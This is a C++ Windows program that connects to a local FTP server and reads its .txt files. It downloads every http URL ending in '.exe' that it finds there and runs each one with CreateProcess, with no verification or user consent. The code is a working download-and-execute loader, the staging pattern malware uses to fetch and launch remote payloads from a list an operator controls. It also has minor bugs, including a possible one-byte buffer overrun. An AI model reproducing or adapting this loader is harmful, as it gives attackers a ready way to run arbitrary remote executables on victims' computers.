#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
#pragma comment(lib, "Wininet")
#include <iostream>
#include <windows.h>
#include <WinInet.h>
#include <string>
#include <sstream>
using namespace std;

HINTERNET internetHandle;

void start_process(string file_name)
{
	PROCESS_INFORMATION infos;
	STARTUPINFO start;
	ZeroMemory(&start, sizeof(start));
	start.cb = sizeof(start);
	ZeroMemory(&infos, sizeof(infos));

	if (!CreateProcess(NULL, (char*)file_name.c_str(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &start, &infos))
	{
		cout << "Create process" << GetLastError();
		return;
	}
	CloseHandle(infos.hProcess);
	CloseHandle(infos.hThread);
}

void DownloadFile(string filename)
{
	HINTERNET httpHandle = InternetOpenUrl(internetHandle, filename.c_str(), NULL, 0, 0, 0);
	auto last_error = GetLastError();
	if (last_error != 0)
	{
		cout << "InternetOpenUrl " << last_error << "\n";
		return;
	}


	char buf[1024];

	DWORD dwTemp;
	DWORD dwBytesRead = 2;
	auto file = string(filename);
	file = file.substr(file.find_last_of("/") + 1);


	HANDLE hFile = CreateFile(file.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		cout << "CreateFile " << GetLastError();
	}

	while (dwBytesRead > 1)
	{
		if(!InternetReadFile(httpHandle, buf, (DWORD)sizeof buf, &dwBytesRead))
		{
			cout << "InternetReadFile " << GetLastError();
		}
		WriteFile(hFile, buf, dwBytesRead, &dwTemp, NULL);
	}

	InternetCloseHandle(httpHandle);
	CloseHandle(hFile);

	start_process(file);
}

inline bool ends_with(std::string const& value, std::string const& ending)
{
	if (ending.size() > value.size()) return false;
	return std::equal(ending.rbegin(), ending.rend(), value.rbegin());
}

inline bool starts_with(std::string const& value, std::string const& start)
{
	return value.find(start) == 0;
}

void readFileContent(HINTERNET intConH, WIN32_FIND_DATAA fileData)
{
	auto readHandler = FtpOpenFile(intConH, fileData.cFileName, GENERIC_READ, FTP_TRANSFER_TYPE_ASCII, 0);
	auto last_error = GetLastError();
	if (last_error != 0)
	{
		cout << "Could not open the file. " << last_error << "\n";
		return;
	}

	char buffer[1000];
	DWORD bytesRead = 0;

	if (!InternetReadFile(readHandler, buffer, 1000, &bytesRead))
	{
		cout << "Could not read from file. " << GetLastError() << "\n";
		return;
	}


	buffer[bytesRead] = '\0';
	istringstream iss(buffer);
	string s;
	while (getline(iss, s, '\n'))
	{
		if (ends_with(s, ".exe") && starts_with(s, "http"))
		{
			cout << s << '\n';
			DownloadFile(s);
		}
	}
	InternetCloseHandle(readHandler);
}


int main()
{
	internetHandle = InternetOpen("test", INTERNET_OPEN_TYPE_PRECONFIG,
	                                        NULL, NULL, NULL);
	if (!internetHandle)
	{
		cout << "InternetOpen " << GetLastError();
		return 0;
	}
	auto internetConnectionHandle = InternetConnect(internetHandle, "127.0.0.1",
	                                                INTERNET_DEFAULT_FTP_PORT, "aaa", NULL, INTERNET_SERVICE_FTP, NULL,
	                                                0);
	if (!internetConnectionHandle)
	{
		cout << "InternetConnect " << GetLastError();
		return 0;
	}

	WIN32_FIND_DATA lpFindFileData = WIN32_FIND_DATA();
	HINTERNET findFileHandler = FtpFindFirstFileA(internetConnectionHandle, "*", &lpFindFileData,
	                                              INTERNET_FLAG_RELOAD & INTERNET_FLAG_NEED_FILE, 0);

	if (ends_with(string(lpFindFileData.cFileName), ".txt"))
	{
		readFileContent(internetConnectionHandle, lpFindFileData);
	}

	auto success = InternetFindNextFile(findFileHandler, &lpFindFileData);
	if (!success)
	{
		cout << "Could not find next file. " << GetLastError() << "\n";
		return 0;
	}
	while (success)
	{
		if (ends_with(string(lpFindFileData.cFileName), ".txt"))
		{
			readFileContent(internetConnectionHandle, lpFindFileData);
		}

		lpFindFileData = WIN32_FIND_DATA();
		success = InternetFindNextFile(findFileHandler, &lpFindFileData);
	}
	InternetCloseHandle(internetHandle);
	return 0;
}
